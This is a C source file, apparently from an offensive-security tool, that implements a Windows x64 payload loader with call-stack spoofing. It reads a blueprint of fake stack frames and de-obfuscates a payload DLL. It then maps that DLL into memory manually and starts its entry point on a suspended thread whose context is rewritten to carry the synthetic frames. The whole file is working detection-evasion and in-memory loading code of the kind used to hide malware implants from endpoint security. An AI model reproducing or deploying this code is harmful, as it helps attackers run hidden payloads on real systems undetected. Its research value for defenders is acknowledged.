#include "common.h"
#include <stdio.h>
#include <wchar.h>
#include <string.h>

#include "unwindraven_core.h"
#include "stack_blueprint.h"
#include "synthetic_stack.h"
#include "pe_loader.h"
#include "veh.h"

BOOL LoadBlueprintFile(
    const CHAR* path,
    StackProfileEntry* out,
    int* outCount
)
{
    FILE* f = NULL;
    int count = 0;
    CHAR line[512];

    if (fopen_s(&f, path, "r") != 0 || !f) {
        printf("[-] Failed to open blueprint file.\n");
        return FALSE;
    }

    while (fgets(line, sizeof(line), f) && count < MAX_STACK_FRAMES) {
        CHAR module[260];
        CHAR func[64];
        unsigned long offset;
        int needLoad;

        if (sscanf_s(line, "%259[^|]|%63[^|]|0x%lx|%d",
                     module, (unsigned)_countof(module),
                     func, (unsigned)_countof(func),
                     &offset,
                     &needLoad) == 4)
        {
            MultiByteToWideChar(CP_ACP, 0, module, -1,
                                out[count].modulePath, MAX_PATH);

            strcpy_s(out[count].functionName,
                     sizeof(out[count].functionName),
                     func);

            out[count].offsetFromExport = (ULONG)offset;
            out[count].needLoad         = needLoad ? TRUE : FALSE;
            out[count].hasOffset        = TRUE;
            out[count].absoluteAddress  = 0;

            count++;
        }
    }

    fclose(f);
    *outCount = count;
    return TRUE;
}

BOOL BuildSyntheticStackFromBlueprint(
    UR_STACK_CONTEXT* sctx,
    const StackProfileEntry* bp,
    int bpCount,
    StackFrame* outFrames,
    int* outFrameCount
)
{
    BuildDynamicStack(sctx, bp, bpCount, outFrames, outFrameCount);
    return (*outFrameCount > 0);
}

BOOL MapPayloadImage(
    const CHAR* dllPath,
    UR_LOADER_CONTEXT* lctx
)
{
    DWORD fileSize = 0;
    PBYTE pRawFile = ReadPayloadFile(dllPath, &fileSize);
    PBYTE pNormalizedPayload;

    if (!pRawFile) {
        printf("[-] Failed to read payload file.\n");
        return FALSE;
    }

    pNormalizedPayload = RunRestorationPipeline(pRawFile, fileSize);
    VirtualFree(pRawFile, 0, MEM_RELEASE);

    if (!pNormalizedPayload) {
        printf("[-] Pipeline transformation layer failure.\n");
        return FALSE;
    }

    printf("[*] lctx=%p &lctx->ImageInfo=%p\n", lctx, &lctx->ImageInfo);
    if (!ValidateAndMapPE(pNormalizedPayload, fileSize, &lctx->ImageInfo)) {
        VirtualFree(pNormalizedPayload, 0, MEM_RELEASE);
        return FALSE;
    }

    /* keep pNormalizedPayload as lctx->ImageInfo.Base */
    return TRUE;
}

static DWORD WINAPI SpoofedLoaderEntry(LPVOID lpParam)
{
    UR_LOADER_CONTEXT* lctx = (UR_LOADER_CONTEXT*)lpParam;
    FnDllMain DllEntry = (FnDllMain)(lctx->ImageInfo.Base + lctx->ImageInfo.EntryRva);

    DllEntry((HINSTANCE)lctx->ImageInfo.Base, DLL_PROCESS_ATTACH, NULL);
    Sleep(INFINITE);
    return 0;
}

HANDLE StartSpoofedThread(
    const StackFrame* frames,
    int frameCount,
    void* entryPoint,
    void* arg1,
    void* arg2,
    void* arg3,
    void* arg4
)
{
    CONTEXT ctx;
    HANDLE hThread;

    RegisterVeh();

    // 1. Create suspended thread
    hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)entryPoint,
        arg1,                  
        CREATE_SUSPENDED,
        &gSpoofedThreadId
    );

    if (!hThread) {
        printf("[-] Failed to create spoofed thread.\n");
        return NULL;
    }

    // 2. Get thread context
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] Failed to get thread context.\n");
        CloseHandle(hThread);
        return NULL;
    }

    // 3. Apply synthetic stack frames
    InitializeFakeThreadState(&ctx, (StackFrame*)frames, frameCount);

    // 4. Set RIP to custom entrypoint
    ctx.Rip = (DWORD64)entryPoint;

    // 5. Apply x64 fastcall parameters
    ctx.Rcx = (DWORD64)arg1;   // first argument
    ctx.Rdx = (DWORD64)arg2;   // second argument
    ctx.R8  = (DWORD64)arg3;   // third argument
    ctx.R9  = (DWORD64)arg4;   // fourth argument

    // 6. Apply modified context
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[-] Failed to set thread context.\n");
        CloseHandle(hThread);
        return NULL;
    }
    printf("[+] Spoofed loader thread created (suspended).\n");
    printf("    PID: %lu\n", GetCurrentProcessId());
    printf("    TID: %lu\n", gSpoofedThreadId);
    printf("    TID (Hex): 0x%lX\n", gSpoofedThreadId);
    printf("[!] Attach WinDbg now if you want to inspect the thread context.\n");
    printf("    Press ENTER to resume the thread...\n");
    getchar();
    
    // 7. Resume thread
    ResumeThread(hThread);

    printf("[+] Spoofed thread started.\n");
    return hThread;
}

HANDLE StartSpoofedLoaderThread(
    const StackFrame* frames,
    int frameCount,
    UR_LOADER_CONTEXT* lctx
)
{
    CONTEXT ctx;
    HANDLE hThread;

    RegisterVeh();  

    // Create suspended thread
    hThread = CreateThread(
        NULL,
        0,
        SpoofedLoaderEntry,
        lctx,
        CREATE_SUSPENDED,
        &gSpoofedThreadId
    );

    if (!hThread) {
        printf("[-] Failed to create spoofed loader thread.\n");
        return NULL;
    }

    // Get thread context
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] Failed to get thread context.\n");
        CloseHandle(hThread);
        return NULL;
    }

    // Ensure SpoofedLoaderEntry receives valid loader context
    ctx.Rcx = (DWORD64)lctx;

    // Apply synthetic stack
    InitializeFakeThreadState(&ctx, (StackFrame*)frames, frameCount);

    // Ensure RIP points to SpoofedLoaderEntry
    ctx.Rip = (DWORD64)SpoofedLoaderEntry;

    // Apply modified context
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[-] Failed to set thread context.\n");
        CloseHandle(hThread);
        return NULL;
    }

    printf("[+] Spoofed loader thread created (suspended).\n");
    printf("    PID: %lu\n", GetCurrentProcessId());
    printf("    TID: %lu\n", gSpoofedThreadId);
    printf("    TID (Hex): 0x%lX\n", gSpoofedThreadId);
    printf("[!] Attach WinDbg now if you want to inspect the thread context.\n");
    printf("    Press ENTER to resume the thread...\n");
    getchar();

    // Resume thread
    ResumeThread(hThread);

    printf("[+] Spoofed loader thread resumed.\n");

    return hThread;
}